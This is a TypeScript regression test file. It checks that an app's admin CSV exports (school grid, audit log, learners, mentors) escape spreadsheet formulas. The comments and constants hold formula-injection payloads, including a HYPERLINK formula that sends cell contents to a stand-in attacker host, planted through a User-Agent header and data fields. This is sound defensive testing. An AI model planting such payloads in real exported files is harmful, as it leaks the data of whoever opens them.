// A CSV export never hands a spreadsheet a live formula.
//
// ── THE DEFECT ───────────────────────────────────────────────────────────────
//
// Every export -- the generic admin grid, the learners and mentors exports and
// the audit log -- called Papa.unparse without escapeFormulae. A cell starting
// with = + - @ is EVALUATED when the file is opened in Excel or LibreOffice,
// and several cells are attacker-controlled: audit_log.user_agent is whatever
// any caller sent (the unsigned WhatsApp webhook audits anonymous internet
// requests), helpdesk tickets store their topic as entity_id, and every
// free-text admin column is typed by someone. =HYPERLINK("https://evil/?"&A2)
// in the audit export -- the file an administrator opens DURING an incident --
// sends that sheet's contents off the machine.
//
// ── WHAT IS EXECUTED ─────────────────────────────────────────────────────────
//
// The real export route handlers, as the roles allowed to call them, against
// Postgres; the CSV they return is parsed back with papaparse. The generic
// import is run on its own export to show the escape round-trips.

import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { request } from "./_ui.js";
import { needsDatabase, withClient, tag } from "./_harness.js";
import { actAs, fixture } from "./_admin-fixture.js";

const skip = needsDatabase();
const Papa = createRequire(new URL("../../apps/web/package.json", import.meta.url))("papaparse") as {
  parse: (s: string, o: { header: boolean; skipEmptyLines: boolean }) => { data: Record<string, string>[] };
};

const FORMULA = /^[=+\-@\t\r]/;
const PAYLOAD = '=HYPERLINK("https://audit-evil.invalid/?leak="&A2,"click")';

function liveFormulaCells(csv: string): string[] {
  const out: string[] = [];
  for (const row of Papa.parse(csv, { header: true, skipEmptyLines: true }).data) {
    for (const v of Object.values(row)) if (typeof v === "string" && FORMULA.test(v)) out.push(v);
  }
  return out;
}

test("the generic grid export escapes a formula typed into a cell, and the import undoes it", { skip }, async () => {
  const { GET } = await import("../../apps/web/src/app/api/admin/data/[entity]/export/route.ts");
  const { importCsv } = await import("../../apps/web/src/app/(authenticated)/admin/data/[entity]/csv.ts");
  await withClient(async (c) => {
    const t = tag("csv-formula");
    const f = fixture(c, t);
    try {
      const district = await f.row("districts", { name: `D ${t}`, code: t.slice(-12) });
      const zone = await f.row("zones", { district_id: district, name: `Z ${t}` });
      await f.row("schools", { zone_id: zone, name: PAYLOAD, code: t.slice(-12), contact_phone: "+91 1985 200001" });
      actAs(await f.user("super_admin", "sadmin"), "super_admin");

      const res = await GET(new Request("http://x/api/admin/data/schools/export"), {
        params: Promise.resolve({ entity: "schools" }),
      });
      assert.equal(res.status, 200);
      const csv = await res.text();
      assert.deepEqual(liveFormulaCells(csv), [], "a cell reaches the spreadsheet as a formula");
      const mine = Papa.parse(csv, { header: true, skipEmptyLines: true }).data.filter((r) => r.code === t.slice(-12));
      assert.equal(mine[0]?.name, `'${PAYLOAD}`, "escaped with the leading apostrophe spreadsheets treat as text");

      // Re-importing the export must not store the apostrophe.
      const header = "name,code,zoneId,contactPhone";
      const line = [`"'${PAYLOAD.replace(/"/g, '""')}"`, `${t.slice(-10)}x`, zone, "'+91 1985 200002"].join(",");
      f.defer(`DELETE FROM schools WHERE code = $1`, [`${t.slice(-10)}x`]);
      const result = await importCsv("schools", `${header}\n${line}\n`);
      assert.equal(result.inserted, 1, JSON.stringify(result));
      const { rows: [s] } = await c.query(`SELECT name, contact_phone FROM schools WHERE code = $1`, [`${t.slice(-10)}x`]);
      assert.equal(s.name, PAYLOAD);
      assert.equal(s.contact_phone, "+91 1985 200002");
    } finally {
      await f.cleanup();
    }
  });
});

test("the audit-log export escapes a formula planted through the User-Agent", { skip }, async () => {
  const { recordAudit } = await import("../../apps/web/src/lib/audit.ts");
  const { GET } = await import("../../apps/web/src/app/api/admin/audit/export/route.ts");
  await withClient(async (c) => {
    const t = tag("csv-audit");
    const f = fixture(c, t);
    try {
      const admin = await f.user("super_admin", "sadmin");
      await f.row("section_gate_grants", { user_id: admin, gate_slug: "admin", expires_at: new Date(Date.now() + 3600_000) });
      request.headers = { "user-agent": PAYLOAD };
      assert.equal(await recordAudit({ action: "helpdesk.ticket_opened", entityType: t, entityId: "@SUM(1+1)*cmd" }), true);
      request.headers = {};

      actAs(admin, "super_admin");
      const res = await GET(new Request(`http://x/api/admin/audit/export?entityType=${t}`));
      assert.equal(res.status, 200);
      const csv = await res.text();
      assert.match(csv, /audit-evil/, "the row under test is in the export");
      assert.deepEqual(liveFormulaCells(csv), [], "the User-Agent / entity id cells reach the spreadsheet as formulas");
    } finally {
      await f.cleanup();
    }
  });
});

test("the learners and mentors exports escape formulae too", { skip }, async () => {
  const learners = await import("../../apps/web/src/app/api/admin/learners/export/route.ts");
  const mentors = await import("../../apps/web/src/app/api/admin/data/mentors/export/route.ts");
  await withClient(async (c) => {
    const t = tag("csv-people");
    const f = fixture(c, t);
    try {
      const district = await f.row("districts", { name: `D ${t}`, code: t.slice(-12) });
      const zone = await f.row("zones", { district_id: district, name: `Z ${t}` });
      const school = await f.row("schools", { zone_id: zone, name: `S ${t}`, code: t.slice(-12) });
      const klass = await f.row("classes", { school_id: school, grade: 4, stage: "Primary" });
      await f.row("learners", { class_id: klass, school_id: school, grade: 4, name: `L ${t}`, guardian: "-2+3" });
      await f.row("mentors", { name: `M ${t}`, base_location: "@SUM(9)" });
      actAs(await f.user("super_admin", "sadmin"), "super_admin");

      const l = await learners.GET(new Request("http://x/api/admin/learners/export"));
      assert.equal(l.status, 200);
      const lcsv = await l.text();
      assert.match(lcsv, new RegExp(`L ${t}`));
      assert.deepEqual(liveFormulaCells(lcsv), [], "learners export");

      const m = await mentors.GET(new Request("http://x/api/admin/data/mentors/export"));
      assert.equal(m.status, 200);
      const mcsv = await m.text();
      assert.match(mcsv, new RegExp(`M ${t}`));
      assert.deepEqual(liveFormulaCells(mcsv), [], "mentors export");
    } finally {
      await f.cleanup();
    }
  });
});
